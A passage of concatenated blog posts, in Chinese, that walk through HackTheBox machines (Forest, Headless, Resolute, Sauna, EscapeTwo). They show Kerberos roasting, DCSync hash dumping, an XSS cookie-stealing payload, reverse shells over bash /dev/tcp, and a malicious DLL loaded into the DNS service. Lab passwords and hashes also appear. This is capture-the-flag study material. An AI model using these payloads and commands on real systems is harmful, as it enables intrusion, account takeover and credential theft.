rid:[0x478]\ruser:[sebastien] rid:[0x479]\ruser:[lucinda] rid:[0x47a]\ruser:[svc-alfresco] rid:[0x47b]\ruser:[andy] rid:[0x47e]\ruser:[mark] rid:[0x47f]\ruser:[santi] rid:[0x480]\ruser:[john] rid:[0x2581] 可以看到最后有几个账户，写入到usernames.txt中\n使用Kerbrute验证用户是否存在\n[root@kali] /home/kali/Forest ❯ ./kerbrute_linux_amd64 userenum -d htb.local usernames.txt --dc htb.local __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\rhtb.local:88\r[+] VALID USERNAME: john@htb.local\r[+] VALID USERNAME: lucinda@htb.local\r[+] VALID USERNAME: svc-alfresco@htb.local\r[+] VALID USERNAME: andy@htb.local\r[+] VALID USERNAME: santi@htb.local\r[+] VALID USERNAME: sebastien@htb.local\r[+] VALID USERNAME: mark@htb.local\rDone! Tested 7 usernames (7 valid) in 0.494 seconds Kerberos Hash #\r[root@kali] /home/kali/Forest ❯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; htb.local/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User sebastien@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User lucinda@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User andy@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User mark@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User santi@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r$krb5asrep$23$svc-alfresco@htb.local@HTB.LOCAL:581886053a84371d1a088f2f1a1939ae$db01aab7678e3e24efe617fa3b286847354bf71b94618cb06a428e0907cec6851c587d4455a66b61e42570a53b419b74c0e4d260292966c7ad18339facaa55ab1007cccf6aaf53f243dacd5b9e473b21d1cfc0ef2ee0ac65cedecd07a7a88a16169d2954ba9ae311d739f9e6fd2ee59a2fb0808d1834efdceadee99bxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\r[-] User john@htb.local doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] invalid principal syntax 可以发现svc-alfresco用户并没开启预身份验证标志，因此工具能够成功获取到该用户的 AS-REP 哈希，进一步密码破解\nCrack password #\r[root@kali] /home/kali/Forest ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])\rWill run 4 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rxxxxxxxxxxxxxxx ($krb5asrep$23$svc-alfresco@htb.local@HTB.LOCAL) 目标机器的5985端口是打开的，可以使用Evil-winrm\nPrivilege Escalation #\rBloodhound #\r将forest.htb.local添加到**/etc/hosts**\n[root@kali] /home/kali/Forest ❯ bloodhound-python -u svc-alfresco -p \u0026#34;xxxxxxxxx\u0026#34; -d htb.local -ns 10.10.xx.xx -c All\rINFO: Found AD domain: htb.local\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: FOREST.htb.local\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 2 computers\rINFO: Connecting to LDAP server: FOREST.htb.local\rINFO: Found 33 users\rINFO: Found 76 groups\rINFO: Found 2 gpos\rINFO: Found 15 ous\rINFO: Found 20 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: EXCH01.htb.local\rINFO: Querying computer: FOREST.htb.local\rWARNING: Failed to get service ticket for FOREST.htb.local, falling back to NTLM auth\rCRITICAL: CCache file is not found. Skipping...\rWARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) 可以看到svc-alfresco拥有John用户，而John用户可以对htb.local进行DCSync攻击\nAbout DCSync #\rDCSync 攻击是一种针对 Active Directory（AD）的攻击方式，攻击者通过模拟域控制器（DC）来获取域中用户的密码哈希。通过这种方式，攻击者无需直接访问目标计算机或服务的密码，而是通过“同步”请求来窃取目标账户的哈希。\nSet John\u0026rsquo;s Password #\r因为分析域内，john是可以进行DCSync攻击，svc是无法直接攻击的，所以需要修改一下他的密码（前提是svc对john有控制权限\n[root@kali] /home/kali/Forest ❯ bloodyAD --host \u0026#39;10.10.xx.xx\u0026#39; -d \u0026#39;htb.local\u0026#39; -u \u0026#39;svc-alfresco\u0026#39; -p \u0026#39;xxxxxxxxx\u0026#39; set password \u0026#39;john\u0026#39; \u0026#39;12345678\u0026#39; [+] Password changed successfully! SecretsDump #\r使用impacket-secretsdump来获取域控上的hash\n[root@kali] /home/kali/Forest ❯ impacket-secretsdump \u0026#34;htb.local/john:12345678\u0026#34;@10.10.10.161 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:3269XXXXXXXXXXXXXXXX:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: 最后Evil-winrm用Hash登录拿到root.txt\nSummary #\rUser：使用rpcclient进行用户枚举，当然也可以使用ldapsearch，不过后者输出格式会更加复杂。使用GetNPUsers来进行免密访问获取账户的哈希（前提是帐户设置了 UF_DONT_REQUIRE_PREAUTH）。随后进行密码爆破，通过5985端口远程登录账户得到user.txt\nRoot：通过拿到的svc账户使用bloodhound进行域内分析，找到一条DCSync的线路，在之前我的文章HTB-Administrator - HYH中也有关于这个的内容。SVC本身账户无法进行DCSync攻击，而需要设置john的密码后通过John实施攻击。\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-forest/","section":"Posts","summary":"","title":"HTB-Forest","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/Headless ❯ nmap headless.htb Not shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r5000/tcp open upnp 进入5000端口查看，自动跳转到一个support路由\nDirsearch #\r[root@kali] /home/kali/Headless ❯ dirsearch -u headless.htb:5000 Target: http://headless.htb:5000/\rStarting: 401 - 317B - /dashboard 200 - 2KB - /support Task Completed 进入dashboard，发现需要身份认证\nSSTI to XSS #\r查看HTTP头发现是用Python搭建的，应该是Flask\n尝试在message部分写入**{{9*9}}，被检测到了，并且会发送给Admin**\n根据这个响应，猜测是要把带有恶意XSS代码的HTTP头发送给Admin，然后获取到Cookie\n在这里选用User-Agent字段进行XSS注入\nPOST /support HTTP/1.1\rHost: headless.htb:5000\rUser-Agent: \u0026lt;img src=1111 onerror=fetch(\u0026#39;http://10.10.xx.xx/?cookie=\u0026#39;+document.cookie);\u0026gt;\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate, br\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 72\rOrigin: http://headless.htb:5000\rConnection: keep-alive\rReferer: http://headless.htb:5000/support\rCookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs\rUpgrade-Insecure-Requests: 1\rPriority: u=0, i\rfname=123\u0026amp;lname=123\u0026amp;email=123%40qq.com\u0026amp;phone=123\u0026amp;message=%7B%7B9*9%7D%7D 设立监听，获取到cookie\nUser #\r进入到Dashboard后是一个生成报告的工具\n抓包后尝试命令执行，可以看到读取到目录文件\ndate=2023-09-15;bash+-c+\u0026#39;bash+-i+\u0026gt;%26+/dev/tcp/10.10.xx.xx/xxxx+0\u0026gt;%261\u0026#39; 设立监听获取到反弹shell\n获取到user.txt\nRoot #\r发现一个具有特殊权限的命令syscheck\n#!/bin/bash\rif [ \u0026#34;$EUID\u0026#34; -ne 0 ]; then\rexit 1\rfi\rlast_modified_time=$(/usr/bin/find /boot -name \u0026#39;vmlinuz*\u0026#39; -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)\rformatted_time=$(/usr/bin/date -d \u0026#34;@$last_modified_time\u0026#34; +\u0026#34;%d/%m/%Y %H:%M\u0026#34;)\r/usr/bin/echo \u0026#34;Last Kernel Modification Time: $formatted_time\u0026#34;\rdisk_space=$(/usr/bin/df -h / | /usr/bin/awk \u0026#39;NR==2 {print $4}\u0026#39;)\r/usr/bin/echo \u0026#34;Available disk space: $disk_space\u0026#34;\rload_average=$(/usr/bin/uptime | /usr/bin/awk -F\u0026#39;load average:\u0026#39; \u0026#39;{print $2}\u0026#39;)\r/usr/bin/echo \u0026#34;System load average: $load_average\u0026#34;\rif ! /usr/bin/pgrep -x \u0026#34;initdb.sh\u0026#34; \u0026amp;\u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;Database service is not running. Starting it...\u0026#34;\r./initdb.sh 2\u0026gt;/dev/null\relse\r/usr/bin/echo \u0026#34;Database service is running.\u0026#34;\rfi\rexit 0 使用ChatGPT进行分析，该脚本的目的是定期检查系统状态并提供以下信息：\n当前系统的内核文件的最后修改时间。\n系统根目录的可用磁盘空间。\n系统负载平均值。\n检查并启动数据库服务（initdb.sh）。\n如果不是 root 用户，脚本会直接退出。\necho \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.12/5555 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt; initdb.sh 运行，另一边监听端口，获取到Root shell\nSummary #\rUser：SSTI的waf引发了XSS漏洞，获取到管理员的Cookie，并且在dashboard里可以进行命令执行，获取到反弹Shell\nRoot：具有特殊权限的命令syscheck，只需把反弹Shell语句写入initdb.sh，在执行syscheck就能获取到Root权限\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-headless/","section":"Posts","summary":"","title":"HTB-Headless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap #\r[root@kali] /home/kali/Resolute ❯ nmap Resolute.htb -sV -T4\rPORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\r445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: MEGABANK)\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped\rService Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows 把megabank.local添加到**/etc/hosts**\nUserEnum #\r[root@kali] /home/kali/Resolute ❯ enum4linux -a megabank.local --or you can use this below\r[root@kali] /home/kali/Resolute ❯ rpcclient -U \u0026#34;\u0026#34; -N 10.10.xx.xx\rrpcclient $\u0026gt; enumdomusers\r--results\ruser:[Administrator] rid:[0x1f4]\ruser:[Guest] rid:[0x1f5]\ruser:[krbtgt] rid:[0x1f6]\ruser:[DefaultAccount] rid:[0x1f7]\ruser:[ryan] rid:[0x451]\ruser:[marko] rid:[0x457]\ruser:[sunita] rid:[0x19c9]\ruser:[abigail] rid:[0x19ca]\ruser:[marcus] rid:[0x19cb]\ruser:[sally] rid:[0x19cc]\ruser:[fred] rid:[0x19cd]\ruser:[angela] rid:[0x19ce]\ruser:[felicia] rid:[0x19cf]\ruser:[gustavo] rid:[0x19d0]\ruser:[ulf] rid:[0x19d1]\ruser:[stevie] rid:[0x19d2]\ruser:[claire] rid:[0x19d3]\ruser:[paulo] rid:[0x19d4]\ruser:[steve] rid:[0x19d5]\ruser:[annette] rid:[0x19d6]\ruser:[annika] rid:[0x19d7]\ruser:[per] rid:[0x19d8]\ruser:[claude] rid:[0x19d9]\ruser:[melanie] rid:[0x2775]\ruser:[zach] rid:[0x2776]\ruser:[simon] rid:[0x2777]\ruser:[naoki] rid:[0x2778] 通过kerbrute检查是否存在\n[root@kali] /home/kali/Resolute ❯ kerbrute userenum -d megabank.local usernames.txt --dc 10.10.xx.xx __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\r10.10.xx.xx:88\r[+] VALID USERNAME: Administrator@megabank.local\r[+] VALID USERNAME: sally@megabank.local\r[+] VALID USERNAME: ryan@megabank.local\r[+] VALID USERNAME: marko@megabank.local\r[+] VALID USERNAME: abigail@megabank.local\r[+] VALID USERNAME: sunita@megabank.local\r[+] VALID USERNAME: marcus@megabank.local\r[+] VALID USERNAME: angela@megabank.local\r[+] VALID USERNAME: fred@megabank.local\r[+] VALID USERNAME: stevie@megabank.local\r[+] VALID USERNAME: felicia@megabank.local\r[+] VALID USERNAME: ulf@megabank.local\r[+] VALID USERNAME: gustavo@megabank.local\r[+] VALID USERNAME: annette@megabank.local\r[+] VALID USERNAME: claire@megabank.local\r[+] VALID USERNAME: paulo@megabank.local\r[+] VALID USERNAME: steve@megabank.local\r[+] VALID USERNAME: annika@megabank.local\r[+] VALID USERNAME: claude@megabank.local\r[+] VALID USERNAME: zach@megabank.local\r[+] VALID USERNAME: melanie@megabank.local\r[+] VALID USERNAME: per@megabank.local\r[+] VALID USERNAME: naoki@megabank.local\r[+] VALID USERNAME: simon@megabank.local 我使用impacket-GetNPUsers查询了未设置预认证的用户，没有发现任何东西\n在rpcclient里查询用户信息的时候我发现了marko用户泄露的密码（很碰巧\nPasswordSpray #\r密码无法直接登录到marko的账户，尝试使用kerbrute密码喷射尝试认证\n[root@kali] /home/kali/Resolute ❯ kerbrute passwordspray -d \u0026#39;megabank.local\u0026#39; --dc \u0026#39;megabank.local\u0026#39; usernames.txt \u0026#39;xxxxxxxxx\u0026#39; __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop\rUsing KDC(s):\rmegabank.local:88\r[+] VALID LOGIN: melanie@megabank.local:xxxxxxxxxxx\rDone! Tested 27 logins (1 successes) in 0.909 seconds 可以看到melanie用这个密码成功登录\n使用Evil-Winrm登录拿到user.txt\nPrivilege Escalation #\r可以看到还存在另一个ryan用户\nHidden Files #\r使用dir -force可以列出隐藏文件\n发现了一个隐藏的文件\n发现了ryan的密码\n登录后在桌面发现一个留言，除了管理员其他任何改动都会在一分钟内恢复\nDNS DLL Inject #\rFrom DnsAdmins to SYSTEM to Domain Compromise | Red Team Notes\nEscalating Privileges with DNSAdmins Group | by Nairuz Abulhul | R3d Buck3T | Medium\n从bloodhound来进行分析可以看出，ryan用户简介属于Dnsadmins这个组\n使用msfvenom生成一个带有修改管理员密码载荷的恶意dll文件\n[root@kali] /home/kali/Resolute ❯ msfvenom -p windows/x64/exec cmd=\u0026#39;net user administrator 12345678 /domain\u0026#39; -f dll \u0026gt; hack.dll ⏎\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\r[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 307 bytes\rFinal size of dll file: 9216 bytes 本地打开smb服务让ryan连接\n[root@kali] /home/kali/Resolute ❯ impacket-smbserver share ./ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Config file parsed\r[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\r[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\r[*] Config file parsed\r[*] Config file parsed 然后在ryan的终端里修改dns设置\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; dnscmd 127.0.0.1 /config /serverlevelplugindll \\\\10.10.xx.xx\\share\\hack.dll\rRegistry property serverlevelplugindll successfully reset.\rCommand completed successfully 然后重启dns服务\n*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe stop dns\r*Evil-WinRM* PS C:\\Users\\ryan\\Documents\u0026gt; sc.exe start dns 最后使用evil-winrm登录拿到root.txt\nSummary #\rUser：在进行enum4linux枚举的时候，发现了用户信息的泄露，并且允许了匿名访问，因此在rpcclient里查看到了泄露的密码，通过密码喷射找出正确的用户名，最后登录拿到user.txt\nRoot：Windows下的隐藏文件使用dir -force可以列出，通过泄露拿到另一个用户ryan的密码。经过bloodhound分析，发现ryan是dnsadmin可以控制域内的DNS服务，因此使用恶意的DNS DLL进行注入，强制修改域内管理员的密码（在note中得知管理员密码不会被恢复），随后远程登录拿到root.txt。\n又学到新东西了！！！\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-resolute/","section":"Posts","summary":"","title":"HTB-Resolute","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Nmap #\r[root@kali] /home/kali/Sauna ❯ nmap Sauna.htb -sV -T4 PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r80/tcp open http Microsoft IIS httpd 10.0\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open tcpwrapped\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)\r3269/tcp open tcpwrapped 把EGOTISTICAL-BANK.LOCAL添加到**/etc/hosts**\nCrack Password #\r在网页中的about页面发现了一些团队成员\nFergus Smith\rShaun Coins\rHugo Bear Bowie Taylor Steven Kerb Sophie Driver 这里使用一个工具将可能的用户名组合列出\n[github author=\u0026ldquo;urbanadventurer\u0026rdquo; project=\u0026ldquo;username-anarchy\u0026rdquo;][/github]\n[root@kali] /home/kali/Sauna/username-anarchy (master) ⚡ ❯ cat usernames.txt fergus\rfergus.smith\rferguss\rfsmith\rshaun\rshaun.coins\rshaunc\rscoins\rhugo\rhugo.bear\rhugob\rhbear\rbowie\rbowie.taylor\rbowiet\rbtaylor\rsteven\rsteven.kerb\rstevenk\rskerb\rsophie\rsophie.driver\rsophied\rsdriver 使用kerbrute进行尝试是否存在这些用户\n[root@kali] /home/kali/Sauna ❯ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL usernames.txt --dc EGOTISTICAL-BANK.LOCAL\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) Ronnie Flathers @ropnop\rUsing KDC(s):\rEGOTISTICAL-BANK.LOCAL:88\r[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL\rDone! Tested 24 usernames (1 valid) in 1.049 seconds 可以看到只存在一个fsmith，下面看一下是否开启了Kerberos 预身份验证\n[root@kali] /home/kali/Sauna ❯ impacket-GetNPUsers -usersfile usernames.txt -no-pass -dc-ip \u0026#34;10.10.xx.xx\u0026#34; EGOTISTICAL-BANK.LOCAL/ ⏎\r$krb5asrep$23$fSmith@EGOTISTICAL-BANK.LOCAL:2bf051fe5d01a87bb394e35afeb5fb52$9109680d602a2ee95749b1c7c8eb999526aaa633047a593d78442d74949dc97d2b565d61ffee5f92ed51a9aa4486561ad901cd7ade464bed9696a10a40fcccabe87883a59903ac99a03e65c16101bf4083dee0e86691cb2060a29a94c983acc7adf6bc16a1abc6fa3d46cea8eb43a1404446698fe5dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 使用John the Ripper进行解密\n[root@kali] /home/kali/Sauna ❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\rxxxxxxxxxxxxx ($krb5asrep$23$fSmith@EGOTISTICAL-BANK.LOCAL) 最后使用Evil-winrm进行登录拿到user.txt\nPrivilege Escalation #\rBloodhound #\r把SAUNA.EGOTISTICAL-BANK.LOCAL添加到**/etc/hosts**\n[root@kali] /home/kali/Sauna ❯ bloodhound-python -u fsmith -p \u0026#34;Thestrokes23\u0026#34; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.xx.xx -c All\rINFO: Found AD domain: egotistical-bank.local\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 1 computers\rINFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Found 7 users\rINFO: Found 52 groups\rINFO: Found 3 gpos\rINFO: Found 1 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL\rINFO: Done in 00M 32S 发现一个可以使用DCSync的用户：SVC_LOANMGR\n两个用户在一个组内，但是fsmith和svc_loanmgr之间没有直接联系\nWinpeas #\r我这里下载的是winpeasx64.exe\nReleases · peass-ng/PEASS-ng 在目标系统上发现了自动登录凭证\nÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials\rSome AutoLogon credentials were found\rDefaultDomainName : EGOTISTICALBANK\rDefaultUserName : EGOTISTICALBANK\\svc_loanmanager\rDefaultPassword : MoneymakesthXXXXXXXXXXX 那么接下来就可以使用DCSync攻击了\nDCSync #\r使用impacket-secretsdump来伪装成DC获取域控上的hash\n[root@kali] /home/kali/Sauna ❯ impacket-secretsdump \u0026#39;EGOTISTICAL-BANK.local/svc_loanmgr:Moneymakestheworldgoround!\u0026#39;@10.10.xx.xx\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\r[*] Using the DRSUAPI method to get NTDS.DIT secrets\rAdministrator:500:aad3b435b51404eeaxxxxxxxxxxx:823452073d75b9dxxxxxxxxxxxxx:::\rGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\rkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: 通过evil-winrm使用hash登录，拿到root.txt\nSummary #\rUser：通过官网上的相关资料尝试爆破用户名，使用工具username-anarchy来获取一些常见的用户名，通过Kerberos的未设置预认证的账户获取到了用户hash进行登录。\nRoot：Bloodhound分析可以进行DCSync攻击，但是和当前用户没有关联，只能上传Winpeas查看系统详细信息，获取到了自动登录的密码，进而进行DCSync\n","date":"2025-01-18","externalUrl":null,"permalink":"/posts/2025/01/htb-sauna/","section":"Posts","summary":"","title":"HTB-Sauna","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su\nNmap #\rroot@kali: /home/kali/EscapeTwo ➜ nmap EscapeTwo.htb -sV -Pn -T4\rNmap scan report for EscapeTwo.htb PORT STATE SERVICE VERSION\r53/tcp open domain Simple DNS Plus\r88/tcp open kerberos-sec Microsoft Windows Kerberos 135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r445/tcp open microsoft-ds?\r464/tcp open kpasswd5?\r593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\r636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000\r3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\r3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\rService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows SMB User Crack #\rroot@kali: /home/kali/EscapeTwo ➜ crackmapexec smb escapetwo.htb -u \u0026#34;rose\u0026#34; -p \u0026#34;KxEPkKe6R8su\u0026#34; --rid-brute | grep SidTypeUser\rSMB EscapeTwo.htb 445 DC01 500: SEQUEL\\Administrator (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 501: SEQUEL\\Guest (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 502: SEQUEL\\krbtgt (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1000: SEQUEL\\DC01$ (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1103: SEQUEL\\michael (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1114: SEQUEL\\ryan (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1116: SEQUEL\\oscar (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1122: SEQUEL\\sql_svc (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1601: SEQUEL\\rose (SidTypeUser)\rSMB EscapeTwo.htb 445 DC01 1607: SEQUEL\\ca_svc (SidTypeUser) SMB File Leak #\r[root@kali] /home/kali/EscapeTwo ❯ smbclient -L //10.10.xx.xx -U rose\rPassword for [WORKGROUP\\rose]:\rSharename Type Comment\r--------- ---- -------\rAccounting Department Disk ADMIN$ Disk Remote Admin\rC$ Disk Default share\rIPC$ IPC Remote IPC\rNETLOGON Disk Logon server share SYSVOL Disk Logon server share Users Disk 在这个Accounting Department中存在表格文件\n[root@kali] /home/kali/EscapeTwo ❯ smbclient //10.10.xx.xx/Accounting\\ Department -U rose ⏎\rPassword for [WORKGROUP\\rose]:\rTry \u0026#34;help\u0026#34; to get a list of possible commands.\rsmb: \\\u0026gt; dir\r. D 0 Sun Jun 9 18:52:21 2024\r.. D 0 Sun Jun 9 18:52:21 2024\raccounting_2024.xlsx A 10217 Sun Jun 9 18:14:49 2024\raccounts.xlsx A 6780 Sun Jun 9 18:52:07 2024\r6367231 blocks of size 4096. 904047 blocks available\rsmb: \\\u0026gt; 查看accounts.xlsx文件发现用户信息泄露\nMSSQL xp_cmdshell #\r[root@kali] /home/kali/EscapeTwo ❯ impacket-mssqlclient escapetwo.htb/sa:MSSXXXXXXXXX@10.10.11.51 ⏎\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS\r[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\r[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\r[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\r[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to \u0026#39;master\u0026#39;.\r[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\r[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands\rSQL (sa dbo@master)\u0026gt; SELECT DB_NAME() AS CurrentDatabase;\rCurrentDatabase --------------- master SQL (sa dbo@master)\u0026gt; 默认的xp_cmdshell没有被打开，需要手动设置\n-- 启用 xp_cmdshell\rEXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;\rRECONFIGURE;\r-- check\rEXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;; 我这使用一个工具进行了反弹Shell，因为在mssql终端中好像命令过长会无法使用\nRelease mssql-command-tools · Mayter/mssql-command-tool [root@kali] /home/kali ❯ ./mssql-command-tools_Linux_amd64 --host 10.10.xx.xx -u \u0026#34;sa\u0026#34; -p \u0026#39;MSSQLP@ssw0rd!\u0026#39; -c \u0026#34;powershell -e yourbase64here\u0026#34; 发现一个配置文件中泄露了sql_svc的信息\nPS C:\\SQL2019\\ExpressAdv_ENU\u0026gt; cat 